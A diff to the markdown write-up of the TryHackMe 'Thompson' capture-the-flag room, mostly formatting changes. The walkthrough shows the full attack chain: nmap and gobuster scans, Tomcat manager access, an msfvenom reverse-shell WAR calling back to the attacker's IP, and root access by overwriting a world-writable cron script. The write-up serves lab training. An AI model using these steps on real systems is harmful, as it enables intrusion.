@@ -5,12 +5,15 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Linux
 Subscription type: Free
 Description: boot2root machine for FIT and bsides guatemala CTF
 ```
+
 Room link: [https://tryhackme.com/r/room/bsidesgtthompson](https://tryhackme.com/r/room/bsidesgtthompson)
 
 ## Solution
@@ -18,6 +21,7 @@ Room link: [https://tryhackme.com/r/room/bsidesgtthompson](https://tryhackme.com
 ### Check for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Thompson]
 └─$ nmap -v -sV -sC 10.10.91.178            
@@ -80,7 +84,9 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 10.00 seconds
 ```
+
 We have three services running:
+
 - OpenSSH v7.2p2 on port 22
 - Apache Jserv (Protocol v1.3) on port 8009
 - Apache Tomcat v8.5.5 on port 8080
@@ -90,6 +96,7 @@ Browsing manually to port 8080 shows a default Apache Tomcat/8.5.5 page.
 ### Scan for web content with gobuster
 
 Next, let's try to identify common directories with `gobuster`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Thompson]
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.91.178:8080 
@@ -120,6 +127,7 @@ Progress: 87664 / 87665 (100.00%)
 Finished
 ===============================================================
 ```
+
 The page `/manager` sounds promising.
 
 ### Analyse the web page
@@ -137,6 +145,7 @@ These are also the correct credentials for the page.
 Furher down on the `Tomcat Web Application Manager` page there is an option to deploy a [WAR file](https://en.wikipedia.org/wiki/WAR_(file_format)).
 
 We can use `msfvenom` from [Metasploit](https://www.metasploit.com/) to create a reverse shell in WAR-format
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Thompson]
 └─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.14.61.233 LPOST=4444 -f war -o rev_shell.war
@@ -145,19 +154,22 @@ Final size of war file: 1094 bytes
 Saved as: rev_shell.war
 ```
 
-Next, we start a netcat listener 
+Next, we start a netcat listener
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Thompson]
 └─$ nc -lvnp 4444            
 listening on [any] 4444 ...
 
 ```
+
 and upload the reverse shell under `WAR file to deploy`.  
 After uploading, trigger the reverse shell by selecting `/rev_shell` on the page.
 
 ### Get a reverse shell
 
 Going back to the netcat listener, we now have a limited shell
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Thompson]
 └─$ nc -lvnp 4444 
@@ -166,8 +178,10 @@ connect to [10.14.61.233] from (UNKNOWN) [10.10.91.178] 46760
 id
 uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
 ```
+
 Before doing anything else we upgrade the shell to a full TTY-shell
-```
+
+```text
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 tomcat@ubuntu:/$ 
 ```
@@ -175,6 +189,7 @@ tomcat@ubuntu:/$
 ### Get the user flag
 
 Now we can start hunting for the user flag
+
 ```bash
 tomcat@ubuntu:/$ find / -type f -name user.txt 2> /dev/null
 find / -type f -name user.txt 2> /dev/null
@@ -188,6 +203,7 @@ tomcat@ubuntu:/$
 ### Privilege escalation
 
 Let's start our enumeration in the same directory where we found the user flag
+
 ```bash
 tomcat@ubuntu:/$ cd /home/jack
 cd /home/jack
@@ -211,6 +227,7 @@ tomcat@ubuntu:/home/jack$
 ```
 
 There are two non-standard files here: `id.sh` (which is writable for everyone!) and `test.txt`
+
 ```bash
 tomcat@ubuntu:/home/jack$ cat id.sh
 cat id.sh
@@ -221,11 +238,13 @@ cat test.txt
 uid=0(root) gid=0(root) groups=0(root)
 tomcat@ubuntu:/home/jack$ 
 ```
+
 We might have a possibility to run code as `root` through the writable `id.sh` file
 
 ### Get the root flag
 
 We only really want the content of the root flag so let's change the script to code that just cat `/root/root.txt`
+
 ```bash
 tomcat@ubuntu:/home/jack$ echo -e '#!/bin/bash\ncat /root/root.txt > test.txt' > id.sh
 <cho -e '#!/bin/bash\ncat /root/root.txt > test.txt' > id.sh                 
@@ -237,22 +256,24 @@ tomcat@ubuntu:/home/jack$
 ```
 
 Then we wait a while and check `test.txt`
+
 ```bash
 tomcat@ubuntu:/home/jack$ cat test.txt
 cat test.txt
 d<REDACTED>a
 tomcat@ubuntu:/home/jack$ 
 ```
+
 Success!
 
 For additional information, please see the references below.
 
 ## References
 
+- [Apache Tomcat - Wikipedia](https://en.wikipedia.org/wiki/Apache_Tomcat)
 - [Gobuster - Github](https://github.com/OJ/gobuster/)
 - [Metasploit - Homepage](https://www.metasploit.com/)
 - [echo - Linux manual page](https://man7.org/linux/man-pages/man1/echo.1.html)
 - [nc - Linux manual page](https://linux.die.net/man/1/nc)
 - [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
-- [Wikipedia - Apache Tomcat](https://en.wikipedia.org/wiki/Apache_Tomcat)
-- [Wikipedia - WAR (file format)](https://en.wikipedia.org/wiki/WAR_(file_format))
+- [WAR (file format) - Wikipedia](https://en.wikipedia.org/wiki/WAR_(file_format))
